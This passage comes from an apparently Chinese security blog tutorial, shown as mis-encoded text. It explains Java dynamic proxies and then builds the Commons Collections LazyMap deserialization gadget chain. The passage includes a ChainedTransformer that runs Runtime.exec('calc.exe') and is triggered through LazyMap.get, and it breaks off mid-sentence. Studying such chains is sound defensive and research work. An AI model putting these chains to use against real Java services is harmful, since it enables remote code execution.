éƒ½æ˜¯å®‰å…¨æ£€æŸ¥å’Œè·å–è®¿é—®æƒé™ï¼Œé‡ç‚¹åœ¨ä»¥ä¸‹ä¸‰å¥ã€‚æœ€é‡è¦çš„å°±æ˜¯getProxyClass0æ–¹æ³•ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713112129827.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713112129827.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>getProxyClass0æ–¹æ³•å†…ï¼Œè°ƒç”¨äº†getæ–¹æ³•æŸ¥æ‰¾ç¼“å­˜å†…æœ‰æ— å·²ç”Ÿæˆçš„ä»£ç†ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713112555131.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713112555131.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡ŒproxyClassCacheæ˜¯ä¸€ä¸ªWeakCacheï¼ŒWeakCacheçš„getæ–¹æ³•å¦‚æœæ²¡æœ‰æŸ¥æ‰¾åˆ°å¯¹åº”é”®å€¼ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ¡ç›®ï¼Œå…·ä½“åˆ›å»ºç»†èŠ‚æ­¤å¤„çœç•¥ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114024588.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114024588.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713113953632.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713113953632.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ProxyClassCacheçš„é”®æ˜¯å¯¹æ¥å£çš„å“ˆå¸Œï¼Œå¦‚è°ƒç”¨çš„Key1æ–¹æ³•ï¼Œå€¼æ˜¯ProxyClassFactoryå·¥å‚ç±»ç”Ÿæˆçš„ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114408167.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114408167.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨ProxyClassFactoryå†…å°±ç”Ÿæˆäº†ä»£ç†å®ä¾‹çš„ç±»å</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114549185.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114549185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713152350740.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713152350740.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ProxyGenerator.generateProxyClassç”Ÿæˆä»£ç†å®ä¾‹çš„å­—èŠ‚ç ï¼ŒdefineClass0åŠ è½½å­—èŠ‚ç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114644105.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114644105.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯¥ç±»ä¸‹è°ƒç”¨çš„generateClassFile()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114843464.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713114843464.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯¥æ–¹æ³•éå†å‘æ¯ä¸ªæ–¹æ³•ä¸­æ·»åŠ äº†generateMethod()æ–¹æ³•ï¼Œè€ŒgenerateMethodåˆ™æ˜¯ç”Ÿæˆåçš„invokeå†…çš„ä»£ç ï¼Œåˆ°è¿™é‡Œå°±ç»“æŸåˆ†æå•¦</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713115049701.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713115049701.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713115155767.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713115155767.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥ä»£ç†ç±»çš„å®ç°æ˜¯é‡æ–°ç”Ÿæˆäº†ä¸€ä¸ªä»£ç†å¯¹è±¡çš„classæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å†…ä¾æ­¤å‘æ¯ä¸ªæ–¹æ³•æ·»åŠ invokeçš„å†…å®¹ï¼Œæœ€ådefineClassåŠ è½½å­—èŠ‚ç ã€‚è®©æˆ‘ä»¬æ¥æ‰¾æ‰¾è¿™ä¸ªclassæ–‡ä»¶ï¼ŒéªŒè¯ä¸€ä¸‹åˆ†æã€‚</p><h3 id="ä»£ç†å¯¹è±¡æ–‡ä»¶åˆ†æ"><a href="#ä»£ç†å¯¹è±¡æ–‡ä»¶åˆ†æ" class="headerlink" title="ä»£ç†å¯¹è±¡æ–‡ä»¶åˆ†æ"></a>ä»£ç†å¯¹è±¡æ–‡ä»¶åˆ†æ</h3><p>ä¸Šæ–‡ä»‹ç»äº†ProxyGenerator.generateProxyClass()æ–¹æ³•ç”Ÿæˆäº†ä»£ç†ç±»çš„å­—èŠ‚ç æ–‡ä»¶ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªè™šæ‹Ÿæœºä¸­çš„æ–‡ä»¶è¾“å‡ºå‡ºæ¥ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713140425820.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713140425820.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬è°ƒç”¨ç®€åŒ–ç‰ˆçš„generateProxyClassï¼Œéšä¾¿å–ä¸ªåå­—ï¼Œä¼ å…¥a.getClass().getInterface()ï¼Œè¾“å‡ºæ–‡ä»¶</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713144645805.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713144645805.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Ainterface</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] classFile = ProxyGenerator.generateProxyClass(<span class="string">&quot;org.example.AProxyExtract&quot;</span>, a.getClass().getInterfaces());</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\AProxyExtract.class&quot;</span>)) &#123;</span><br><span class="line">            fos.write(classFile);</span><br><span class="line">            fos.flush();</span><br><span class="line">            System.out.println(<span class="string">&quot;ä»£ç†ç±»classæ–‡ä»¶å†™å…¥æˆåŠŸ&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å†™æ–‡ä»¶é”™è¯¯&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¾“å‡ºçš„æ–‡ä»¶ä¸­ï¼Œé™æ€ä»£ç å—è·å–äº†åŸæœ¬æ¥å£çš„æ–¹æ³•ï¼Œèµ‹ç»™<code>mæ•°å­—</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151330052.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151330052.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸”è¯¥ç±»ï¼ˆAProxyExtractï¼‰ç»§æ‰¿äº†Proxyç±»ï¼Œåˆ™newProxyInstanceç”Ÿæˆçš„å­ç±»ä¹Ÿå¯ä»¥åºåˆ—åŒ–ã€‚</p><p>æˆ‘ä»¬ç›´æ¥æŸ¥çœ‹è¯¥ç±»é‡Œçš„displayæ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151732423.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151732423.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>super.hå°±æ˜¯æˆ‘ä»¬å‘å…¶çˆ¶ç±»ä¼ çš„InvocationHandlerï¼Œä¹Ÿå°±æ˜¯<code>new AdynamicProxy(a)</code>ï¼Œå¯ä»¥çœ‹åˆ°ç›´æ¥è°ƒç”¨äº†è¿™ä¸ªä»£ç†ç±»çš„invokeæ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151852698.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713151852698.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å°±å…¨éƒ¨èƒ½è§£é‡Šé€šäº†</p><h3 id="åŠ¨æ€ä»£ç†ç±»ä¸­å­˜åœ¨å¤šæ¥å£çš„é—®é¢˜"><a href="#åŠ¨æ€ä»£ç†ç±»ä¸­å­˜åœ¨å¤šæ¥å£çš„é—®é¢˜" class="headerlink" title="åŠ¨æ€ä»£ç†ç±»ä¸­å­˜åœ¨å¤šæ¥å£çš„é—®é¢˜"></a>åŠ¨æ€ä»£ç†ç±»ä¸­å­˜åœ¨å¤šæ¥å£çš„é—®é¢˜</h3><p>å‡è®¾åŠ¨æ€ä»£ç†ç±»ä¸ºå¦‚ä¸‹ä»£ç ï¼Œè¯·é—®è¢«ä»£ç†ç±»å¯ä»¥æ˜¯å“ªç§ï¼ŒProxy.newProxyInstanceåˆè¯¥æ€ä¹ˆä¼ å‚ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdynamicProxy</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Ainterface a;</span><br><span class="line">    <span class="keyword">private</span> Binterface b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AdynamicProxy</span><span class="params">(Ainterface a,Binterface b)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = a;</span><br><span class="line">        <span class="built_in">this</span>.b = b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(a, args);</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†&quot;</span>+methodName);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼ŒnewProxyInstanceå¯ä»¥ä¼ å¤šä¸ªæ¥å£ï¼Œç”Ÿæˆçš„AdynamicProxyä¹Ÿéœ€è¦åˆ†åˆ«ä¼ ä¸¤ä¸ªå®ç°äº†A&#x2F;Binterfaceæ¥å£çš„ç±»ã€‚é‚£AdynamicProxyå°±åŒæ—¶ä»£ç†äº†ä¸¤ä¸ªç±»ï¼Œä½†æ˜¯invokeæ˜¯æ‰§è¡Œaä¸­çš„æ–¹æ³•ï¼Œæ˜¾ç„¶è¿™æ ·å†™æ˜¯ä¸è¡Œçš„ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713210623620.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713210623620.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŠŠinvokeæ”¹æˆå¦‚ä¸‹ï¼ŒgetDeclaringClass()åˆ¤æ–­è¯¥æ–¹æ³•æ¥è‡ªå“ªä¸ªæ¥å£ï¼Œå°±èƒ½åŒæ—¶ä»£ç†ä¸¤ä¸ªç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    Object result;</span><br><span class="line">    <span class="keyword">if</span> (Ainterface.class.isAssignableFrom(method.getDeclaringClass())) &#123;</span><br><span class="line">        result = method.invoke(a, args);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Binterface.class.isAssignableFrom(method.getDeclaringClass())) &#123;</span><br><span class="line">        result = method.invoke(b, args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unsupported interface&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    System.out.println(<span class="string">&quot;è°ƒç”¨äº†&quot;</span> + methodName);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸åº”çš„ï¼Œä¼ å‚å¦‚ä¸‹ï¼Œæ ¹æ®éœ€è¦ç”¨Ainterfaceæˆ–Binterfaceå­˜å‚¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Binterface</span> <span class="variable">aproxy</span> <span class="operator">=</span> (Binterface) Proxy.newProxyInstance(Ainterface.class.getClassLoader(), </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Ainterface.class, Binterface.class&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AdynamicProxy</span>(a,b));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="LazyMapé“¾"><a href="#LazyMapé“¾" class="headerlink" title="LazyMapé“¾"></a>LazyMapé“¾</h2><p>æ€»ç»“ä¸Šæ–‡åŠ¨æ€ä»£ç†çš„å†…å®¹å¦‚ä¸‹ï¼š</p><blockquote><p>åŠ¨æ€ä»£ç†æ˜¯å¯¹ä¸€ä¸ªç±»ä¸‹æ‰€æœ‰æ–¹æ³•çš„ä»£ç†ï¼Œç”¨Proxy.newProxyInstance()åˆ›å»ºï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªå®ç°äº†InvocationHandlerï¼Œé‡å†™äº†invokeæ–¹æ³•çš„å®ä¾‹ã€‚åœ¨è°ƒç”¨è¯¥ä»£ç†ç±»æ–¹æ³•æ—¶ï¼Œä¼šè‡ªåŠ¨è·³è½¬æ‰§è¡Œinvokeå†…çš„å†…å®¹ã€‚</p><p>å…±éœ€è¦ä¸€ä¸ªæ¥å£ï¼Œä¸€ä¸ªå®ç°äº†è¯¥æ¥å£çš„è¢«ä»£ç†ç±»ï¼Œä¸€ä¸ªå®ç°äº†InvocationHnadlerçš„ä»£ç†ç±»ï¼Œæœ€åProxy.newInstance()åˆ›å»ºä»£ç†å®ä¾‹ã€‚</p></blockquote><p>æœ€ç®€å•çš„TransformedMapé“¾</p><p><a href="https://godownio.github.io/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/">https://godownio.github.io/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/</a></p><p>ä¸­ï¼Œç”¨TransformeredMap.checkSetValueè§¦å‘ChainedTransformer.transformã€‚åŒæ—¶æˆ‘ä»¬ä¹Ÿèƒ½çœ‹åˆ°LazyMap.getä¹Ÿè°ƒç”¨äº†transformæ–¹æ³•ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713154230857.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713154230857.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬å°è¯•é€šè¯»ä¸€ä¸‹LazyMapç±»ï¼Œå’ŒTransformedMapä¸€æ ·ï¼Œæ„é€ æ–¹æ³•æ˜¯protectedç±»å‹ï¼Œé€šè¿‡decorateè°ƒç”¨æ„é€ å‡½æ•°å¯¹mapè¿›è¡Œè£…é…ï¼Œåªä¸è¿‡è¿™é‡Œé™¤äº†mapå¤–åªæ¥æ”¶äº†ä¸€ä¸ªTransformerå‚æ•°ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713190824083.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713190824083.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ„é€ å‡½æ•°å­˜å‚¨ä¼ å…¥çš„Transformer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713191550433.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713191550433.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨getå‡½æ•°å†…ï¼Œå¦‚æœmapå†…æœ‰ä»¥å‚æ•°keyä¸ºé”®çš„å€¼ï¼Œåˆ™è¿”å›è¯¥å€¼ã€‚å¦‚æœæ²¡æœ‰ï¼Œä½¿ç”¨è°ƒç”¨factory.transform()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713191128650.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713191128650.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä»ä»¥ä¸Šå†…å®¹å¯ä»¥çœ‹å‡ºæ¥ï¼ŒLazyMap.decorateæ˜¯æŠŠä¼ å…¥çš„Transformerç»‘å®šåˆ°LazyMapã€‚getå‡½æ•°å°±æ˜¯ä»mapä¸­æŸ¥æ‰¾ä»¥Transfomerä¸ºé”®çš„å€¼ï¼Œæ²¡æœ‰å°±è°ƒç”¨å½“å‰Transformerçš„transformæ–¹æ³•ï¼ŒæŠŠè¿”å›å¯¹è±¡åšä¸ºvalueæ·»åŠ è¿›mapã€‚</p><p>ä¹Ÿå°±æ˜¯ï¼šLazyMapæ„ä¸ºæ‡’è£…é…Mapï¼Œä¸åƒå…¶ä»–Mapï¼ŒLazyMapçš„åˆ›å»ºåªéœ€è¦ä¼ å…¥é”®ï¼Œåœ¨getæ—¶æ‰æŠŠé”®å’Œtransformè¿”å›çš„ç»“æœputè¿›mapã€‚</p><p>ä¹¦æ¥ä¸Šæ–‡<a href="https://godownio.github.io/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/">https://godownio.github.io/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/</a></p><p>æˆ‘ä»¬æ„é€ chainedTransformerä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//chainedTransformer1</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ§åˆ¶factoryä¸ºchainedTransformerï¼Œä¸”è®¾ç½®çš„mapä¸­ä¸å­˜åœ¨ä»¥chainedTransformä¸ºé”®ï¼Œå³å¯æˆåŠŸè°ƒç”¨chainedTransformer.transform()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">lazyMap.get(<span class="string">&quot;godown&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713193344329.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713193344329.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="AnnotationInvocationHandleråŠ¨æ€ä»£ç†"><a href="#AnnotationInvocationHandleråŠ¨æ€ä»£ç†" class="headerlink" title="AnnotationInvocationHandleråŠ¨æ€ä»£ç†"></a>AnnotationInvocationHandleråŠ¨æ€ä»£ç†</h3><p>ç”±äºè°ƒç”¨åˆ°getçš„æ–¹æ³•å®åœ¨æ˜¯å¤ªå¤šäº†ï¼ˆæ‰€ä»¥ä½ èƒ½æŒ–å‡ºçš„ä¹Ÿå¾ˆå¤šï¼‰ï¼Œå®˜æ–¹ç»™å‡ºçš„ä¸‹ä¸€æ­¥æ˜¯åœ¨AnnotationInvocationHandlerçš„invokeä¸­è°ƒç”¨getæ–¹æ³•ã€‚</p><p>AnnotationInvocationHandlerå®ç°äº†InvocationHandleræ¥å£ï¼Œå¹¶é‡å†™äº†invokeæ–¹æ³•ï¼Œå…¸å‹çš„ä»£ç†ç±»ï¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200033341.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200033341.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆ©ç”¨åå°„åœ¨ç§æœ‰æ„é€ å‡½æ•°ä¸­æŠŠmemberValuesè®¾ä¸ºlazymap</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200252091.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200252091.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>getçš„å‚æ•°memberæ˜¯ä»£ç†å¯¹è±¡è°ƒç”¨çš„æ–¹æ³•åï¼Œæ— æ‰€è°“ï¼Œä¸å¯èƒ½æ˜¯chainedTransformer<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200606754.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713200606754.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£æˆ‘ä»¬åº”è¯¥é€‰æ‹©å“ªä¸ªè¢«ä»£ç†ç±»å‘¢ï¼Ÿ</p><p>åœ¨getå‰çš„ä»£ç ï¼Œå¦‚æœè°ƒç”¨çš„æ–¹æ³•åä¸ºequalsï¼ŒtoStringï¼ŒhashCodeï¼ŒannotaionTypeä¸­çš„ä»»æ„ä¸€ä¸ªæ–¹æ³•éƒ½ä¼šç«‹åˆ»returnï¼Œä¸”<code>assert paramTypes.length == 0;</code>è¡¨ç¤º<code>paramType.length != 